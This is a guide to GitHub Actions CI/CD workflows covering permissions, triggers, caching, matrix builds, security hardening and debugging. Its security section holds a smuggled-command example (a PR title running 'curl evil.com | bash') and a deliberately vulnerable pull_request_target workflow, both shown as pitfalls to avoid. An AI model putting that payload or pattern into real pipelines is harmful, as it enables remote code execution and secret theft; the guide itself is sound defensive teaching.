---
name: github-actions-ci
description: GitHub Actions CI/CD patterns covering workflow anatomy, trigger strategies, caching, matrix builds, security hardening, reusable workflows, and pipeline debugging. Use this skill whenever writing or editing .github/workflows/*.yml files, debugging a failed CI run, setting up CI for a new repository, optimizing slow or flaky pipelines, or implementing release automation — even for small edits, since YAML structure and security pitfalls are easy to introduce silently.
---

# GitHub Actions CI/CD Patterns

Practical patterns for reliable, secure, and efficient GitHub Actions workflows.

## Workflow Anatomy & Sane Defaults

Every production workflow needs three top-level settings that GitHub omits by default:

```yaml
# ❌ WRONG: No permissions, no timeout, no concurrency control
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

# ✅ CORRECT: Locked down from the start
permissions:
  contents: read       # only what this job actually needs
  # add pull-requests: write only if the job posts PR comments, etc.

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true   # kill stale PR runs, save runner minutes

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15      # default is 360 — a hung job silently burns quota
    steps:
      - uses: actions/checkout@v4
```

- `permissions: contents: read` at the workflow level sets the floor; individual jobs can widen it. The default `read-all` is too broad and violates least privilege.
- `timeout-minutes` on every job prevents a runaway process from consuming the monthly runner budget.
- `cancel-in-progress: true` is correct for PR branches; for the default branch use `cancel-in-progress: false` so deploys are not interrupted mid-flight.

## Trigger Patterns

### pull_request vs push, and path filters

```yaml
# ❌ WRONG: Runs CI on every push including docs-only changes
on:
  push:
    branches: [main]
  pull_request:

# ✅ CORRECT: Skip unrelated paths, gate on relevant branches
on:
  push:
    branches: [main]
    paths:
      - 'src/**'
      - 'go.sum'
      - '.github/workflows/ci.yml'
  pull_request:
    branches: [main]
    paths:
      - 'src/**'
      - 'go.sum'
      - '.github/workflows/ci.yml'
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        default: 'staging'
        type: choice
        options: [staging, production]
```

- `paths` filters reduce noise and cost; always include the workflow file itself so changes to CI always trigger a run.
- `workflow_dispatch` with typed `inputs` lets humans trigger controlled deploys without pushing a dummy commit.

### pull_request_target — a privilege-escalation trap

```yaml
# ❌ DANGEROUS: pull_request_target runs in the context of the BASE branch,
# with full repository secrets, even for PRs from forks.
# Never check out the PR's code and run it here.
on:
  pull_request_target:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4   # ← checks out ATTACKER-CONTROLLED code
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm run build  # ← runs attacker code with secrets

# ✅ CORRECT: Use pull_request (no secrets) for build/test,
# pull_request_target ONLY for safe, no-checkout operations like labeling.
on:
  pull_request_target:
    types: [opened]
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5    # operates on PR metadata only, never on code
```

## Caching

### Built-in caching via setup actions

```yaml
# ✅ PREFERRED: actions/setup-go has built-in cache support
- uses: actions/setup-go@v5
  with:
    go-version: "1.22"
    cache: true # caches the module cache automatically

- uses: actions/setup-node@v4
  with:
    node-version: "20"
    cache: "npm" # or 'yarn' / 'pnpm'
```

### Manual cache with explicit keys

Use `actions/cache` when the setup action does not cover your case (e.g., a custom tool cache or build artifacts):

```yaml
# ✅ CORRECT: deterministic primary key + restore-keys fallback
- uses: actions/cache@v4
  with:
    path: ~/.cache/custom-tool
    key: ${{ runner.os }}-custom-${{ hashFiles('**/lockfile') }}
    restore-keys: |
      ${{ runner.os }}-custom-

# ❌ WRONG: hard-coded or date-based keys defeat the purpose
- uses: actions/cache@v4
  with:
    path: ~/.cache/custom-tool
    key: my-cache-v1 # never invalidates on dependency changes
```

- `hashFiles('**/go.sum')` (or `package-lock.json`, `Pipfile.lock`) ties the cache to the exact dependency graph.
- `restore-keys` provides a prefix fallback so a cache miss still benefits from a partially warm cache.
- Caches are scoped to a branch; the default branch's cache is readable by PRs, so warm main-branch caches speed up PRs.

## Matrix Builds

```yaml
jobs:
  test:
    strategy:
      fail-fast: false # let all matrix legs finish to see all failures
      matrix:
        os: [ubuntu-latest, macos-latest]
        go: ["1.21", "1.22"]
        exclude:
          - os: macos-latest
            go: "1.21" # skip combinations that aren't worth the cost
        include:
          - os: ubuntu-latest
            go: "1.22"
            coverage: true # add extra fields for specific legs
    runs-on: ${{ matrix.os }}
    timeout-minutes: 20
    steps:
      - uses: actions/setup-go@v5
        with:
          go-version: ${{ matrix.go }}
      - if: matrix.coverage
        run: go test -coverprofile=coverage.out ./...
```

- `fail-fast: false` is often better for debugging: seeing which legs failed is more useful than stopping at the first failure.
- `include` adds properties to specific matrix combinations without creating new rows.
- `exclude` drops expensive or redundant combinations; cross-OS × cross-version matrices explode quickly.

## Security

### Pin third-party actions to full commit SHA

```yaml
# ❌ WRONG: tags are mutable — a compromised maintainer can repoint v4 to malicious code
- uses: actions/checkout@v4
- uses: some-third-party/action@main

# ✅ CORRECT: pin to an immutable commit SHA, add the version as a comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: some-third-party/action@a1b2c3d4e5f6... # v1.3.0
```

- GitHub-owned actions under `actions/*` are lower risk but still worth pinning for reproducibility.
- Use a tool like `pin-github-action` or Renovate to automate SHA pinning and updates.

### Minimal GITHUB_TOKEN permissions

```yaml
# ✅ CORRECT: declare minimum permissions per job, not once globally for everything
jobs:
  release:
    permissions:
      contents: write # needed to create a GitHub Release
      id-token: write # needed for OIDC-based publishing (e.g., npm, PyPI)
    runs-on: ubuntu-latest
```

### Script injection — never interpolate untrusted input into `run:`

```yaml
# ❌ WRONG: an attacker sets the PR title to `"; curl evil.com | bash; echo "`
- name: Comment PR title
  run: echo "PR title is ${{ github.event.pull_request.title }}"

# ✅ CORRECT: pass untrusted values through environment variables
- name: Comment PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $PR_TITLE"
```

- `github.event.pull_request.title`, `github.head_ref`, `github.event.issue.body`, and any user-controlled input must be passed as `env:` vars, never interpolated directly with `${{ }}` into shell commands.
- Secrets must never appear in `run: echo` or any command that writes to logs. GitHub redacts known secret values, but structured output (base64, JSON-encoded) can bypass redaction.

## Reusable Workflows vs Composite Actions

|          | Reusable workflow (`workflow_call`)          | Composite action (`action.yml`)             |
| -------- | -------------------------------------------- | ------------------------------------------- |
| Unit     | Full workflow with jobs                      | Single step (used inside a job)             |
| Secrets  | Can receive `secrets: inherit`               | Cannot receive secrets directly             |
| Runners  | Caller or callee can specify `runs-on`       | Runs on caller's runner                     |
| Best for | Shared CI pipelines, environment deployments | Shared step sequences (setup, lint, notify) |

```yaml
# Reusable workflow: .github/workflows/reusable-test.yml
on:
  workflow_call:
    inputs:
      go-version:
        required: true
        type: string
    secrets:
      CODECOV_TOKEN:
        required: false

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@d60b41a563a30bbebf5e21bcf7bcc78e09a15f8f # v5.5.0
        with:
          go-version: ${{ inputs.go-version }}
      - run: go test ./...
```

```yaml
# Caller workflow
jobs:
  call-test:
    uses: ./.github/workflows/reusable-test.yml
    with:
      go-version: "1.22"
    secrets: inherit
```

Use reusable workflows when you want an independent job graph (parallelism, `needs:`, different runners). Use composite actions when you are extracting a few repeated steps inside an existing job.

## Debugging Failed Runs

Work from broad to narrow — inspect logs before pushing blind fixes:

```bash
# List recent runs for the current branch
gh run list --branch $(git branch --show-current)

# Show only the failed steps (avoids scrolling through thousands of lines)
gh run view <RUN_ID> --log-failed

# Re-run only the failed jobs (saves time on large matrices)
gh run rerun <RUN_ID> --failed

# Download artifacts for offline inspection (e.g., test reports, coverage)
gh run download <RUN_ID>
```

Enable step-level debug logging without changing workflow files:

```bash
# Set repository variables (not secrets) for a single re-run
gh variable set ACTIONS_STEP_DEBUG --body true
gh variable set ACTIONS_RUNNER_DEBUG --body true
```

Reproduce locally before pushing fix attempts: use `act` (https://github.com/nektos/act) to run workflows against a local Docker runner. Blind push-fix-push cycles inflate run counts and obscure the real issue.

## Artifacts & Job Outputs

### Upload artifacts for inspection

```yaml
- name: Run tests
  run: go test -v ./... 2>&1 | tee test-output.txt; exit ${PIPESTATUS[0]}

- uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
  if: always() # upload even on failure so you can see what went wrong
  with:
    name: test-results
    path: test-output.txt
    retention-days: 7
```

### Pass data between jobs via outputs

```yaml
jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      tag: ${{ steps.get-tag.outputs.tag }}
    steps:
      - id: get-tag
        run: echo "tag=$(git describe --tags --abbrev=0)" >> "$GITHUB_OUTPUT"

  release:
    needs: version
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing ${{ needs.version.outputs.tag }}"
```

- Use `$GITHUB_OUTPUT` (not `set-output`, which is deprecated) for step outputs.
- Use `if: always()` on artifact uploads so failures are debuggable; omit it for release artifacts you only want on success.

## Common Pipeline Shape

A three-stage lint → test → build pipeline wires together the patterns above:

```yaml
name: CI

on:
  pull_request:
    branches: [main]
    paths: ["src/**", "go.sum", ".github/workflows/ci.yml"]
  push:
    branches: [main]

permissions:
  contents: read

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

jobs:
  lint:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@d60b41a563a30bbebf5e21bcf7bcc78e09a15f8f # v5.5.0
        with:
          go-version: "1.22"
          cache: true
      - run: go vet ./...

  test:
    needs: lint
    runs-on: ubuntu-latest
    timeout-minutes: 20
    strategy:
      fail-fast: false
      matrix:
        go: ["1.21", "1.22"]
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@d60b41a563a30bbebf5e21bcf7bcc78e09a15f8f # v5.5.0
        with:
          go-version: ${{ matrix.go }}
          cache: true
      - run: go test -race -coverprofile=coverage.out ./...
      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        if: always()
        with:
          name: coverage-${{ matrix.go }}
          path: coverage.out
          retention-days: 7

  build:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: write # needed to publish a release
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - uses: actions/setup-go@d60b41a563a30bbebf5e21bcf7bcc78e09a15f8f # v5.5.0
        with:
          go-version: "1.22"
          cache: true
      - run: go build -o dist/app ./cmd/app
```

- `needs: lint` blocks the test matrix until lint passes, avoiding wasted compute.
- `if: github.ref == 'refs/heads/main'` gates the release-capable build job to the default branch only.
- `cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}` cancels PR runs but never cancels an in-progress main-branch deploy.

## Checklist

Before merging a workflow change:

- [ ] `permissions:` declared at workflow or job level; no implicit `contents: write` or `write-all`
- [ ] `timeout-minutes:` set on every job (default 360 is a budget trap)
- [ ] `concurrency:` group configured; `cancel-in-progress` value matches the branch intent
- [ ] Third-party actions pinned to full commit SHA with version comment
- [ ] No `${{ github.event.* }}` interpolated directly into `run:` blocks — use `env:` vars
- [ ] No secrets echoed or logged; secrets referenced only via `${{ secrets.NAME }}`
- [ ] `pull_request_target` used only for safe, no-code-checkout operations
- [ ] Cache keys include `hashFiles` over the lockfile; `restore-keys` prefix defined
- [ ] `fail-fast: false` on matrix jobs unless early termination is intentional
- [ ] `upload-artifact` with `if: always()` on test/coverage outputs for debuggability
- [ ] Reusable workflow extracted if the same job block appears in two or more workflows
- [ ] Tested with `gh run view --log-failed` on first run; not debugged by blind push loops
